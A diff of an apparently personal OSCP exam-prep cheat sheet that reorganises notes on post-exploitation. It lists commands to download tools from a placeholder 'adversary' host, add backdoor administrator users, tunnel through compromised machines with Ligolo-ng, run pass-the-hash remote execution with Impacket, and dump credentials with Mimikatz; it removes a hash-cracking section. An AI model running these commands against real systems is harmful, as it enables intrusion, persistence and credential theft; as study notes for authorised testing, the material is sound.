@@ -2,9 +2,11 @@
 
 Notes from preparation for OSCP exam. 
 
-# File Transfers
+# Common commands
 
-## Windows to Kali
+## File transfer
+
+### Between Kali and Windows
 
 ```bash
 # kali
@@ -13,7 +15,7 @@ impacket-smbserver -smb2support <sharename> .
 copy file \\KaliIP\sharename
 ```
 
-## Netcat
+### Using Netcat
 
 ```bash
 # Attacker
@@ -23,7 +25,7 @@ nc target_ip 1234 < nc64.exe
 nc -lvp 1234 > nc64.exe
 ```
 
-## Downloading on Windows
+### Downloading from Windows
 
 ```powershell
 bash -command Invoke-WebRequest -Uri http://adversary:port/FILE -Outfile C:\\temp\\FILE
@@ -32,18 +34,16 @@ certutil -urlcache -split -f "http://adversary:port/FILE" FILE
 copy \\kali\share\file .
 ```
 
-## Downloading on Linux
+### Downloading on Linux
 
 ```bash
 wget http://adversary:port/FILE
 curl http://adversary:port/FILE OUTPUT_FILE
 ```
 
+## Adding Users
 
-
-# Adding Users
-
-## Windows
+### Windows
 
 ```bash
 net user adversary Password123 /add
@@ -51,7 +51,7 @@ net localgroup Administrators adversary /add
 net localgroup "Remote Desktop Users" adversary /add
 ```
 
-## Linux
+### Linux
 
 ```bash
 adduser user # Interactive
@@ -60,39 +60,11 @@ useradd user
 useradd -u UID -g group user  
 ```
 
-# Password-Hash Cracking
+# Tunneling and stuff
 
-## Determine hash type
+![krieger-tick](https://github.com/Br14n41/oscp-stuffs/assets/57382125/5515478d-515a-4d9f-b321-ba98e89eafb3)
 
-*Hash Analyzer*: [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/) 
-
-## Is hash well known? 
-
-*Crackstation*: [https://crackstation.net/](https://crackstation.net/)
-
-## JtR (John the Ripper)
-
-```bash
-# Main *2john(s)...
-ssh2john id_rsa > hash.ssh
-kee2john db.kdbx > hash.keepass
-zip2john file.zip > hash.zip 
-
-*Full List*: https://github.com/openwall/john/tree/bleeding-jumbo/run 
-
-# Convert the obtained hash to John format(above link)
-john hashfile --wordlist=rockyou.txt
-```
-
-## Hashcat
-
-```bash
-# Obtain the Hash module number 
-hashcat -h | grep ntlm
-hashcat -m 1000 hash wordlists.txt --force
-```
-
-# SSH tunneling and stuff
+## SSH
 
 ```bash
 # TOR port
@@ -136,9 +108,38 @@ sudo echo "socks5 127.0.0.1 9998" >> /etc/proxychains4.conf
 proxychains nmap -vvv -sT --top-ports=20 -Pn -n INTERNAL
 ```
 
+## Ligolo-ng
+
+```bash
+# Creating interface and starting it.
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+# Kali machine - Attacker machine (I have proxy placed into /usr/bin)
+proxy -selfcert
+
+# To manually set port
+proxy -laddr 0.0.0.0:9001 -selfcert
+
+# windows or linux machine - compromised machine
+agent.exe -connect LHOST:PORT -ignore-cert -retry
+
+# In Ligolo-ng console
+# select host
+session
+# Notedown the internal network's subnet
+ifconfig
+# after adding relevent subnet to ligolo interface
+start_tunnel
+
+# Adding subnet to ligolo interface - Kali linux
+sudo ip r add <subnet> dev ligolo
+
+```
+
 # Getting the most from discovered passwords
 
-## When you suspect brute forcing or have cracked some hashes:
+### When you suspect brute forcing or have cracked some hashes:
 
     - Have a valid usernames first
     - Dont firget trying `admin:admin`
@@ -147,7 +148,9 @@ proxychains nmap -vvv -sT --top-ports=20 -Pn -n INTERNAL
     - Service name as the username as well as the same name for password.
     - Use rockyou.txt
 
-# Impacket
+# Attacking Windows
+
+## Impacket
 
 ```bash
 # We connect to the server rather than a share
@@ -187,7 +190,7 @@ impacket-atexec -hashes lmhash:nthash test.local/john@10.10.10.1 <command>
 
 ```
 
-# Evil-Winrm
+## Evil-Winrm
 
 ```bash
 # winrm service discovery
@@ -231,7 +234,7 @@ menu
 Invoke-Binary /opt/privsc/winPEASx64.exe
 ```
 
-# Mimikatz
+## Mimikatz
 
 ```bash
 privilege::debug
@@ -248,29 +251,6 @@ lsadump::lsa /patch
 
 # OneLiner
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
-
-```
-
-# Ligolo-ng
-
-```bash
-# Creating interface and starting it.
-sudo ip tuntap add user $(whoami) mode tun ligolo
-sudo ip link set ligolo up
-
-# Kali machine - Attacker machine
-./proxy -laddr 0.0.0.0:9001 -selfcert
-
-# windows or linux machine - compromised machine
-agent.exe -connect <LHOST>:9001 -ignore-cert
-
-# In Ligolo-ng console
-session # select host
-ifconfig # Notedown the internal network's subnet
-start # after adding relevent subnet to ligolo interface
-
-# Adding subnet to ligolo interface - Kali linux
-sudo ip r add <subnet> dev ligolo
 
 ```
 
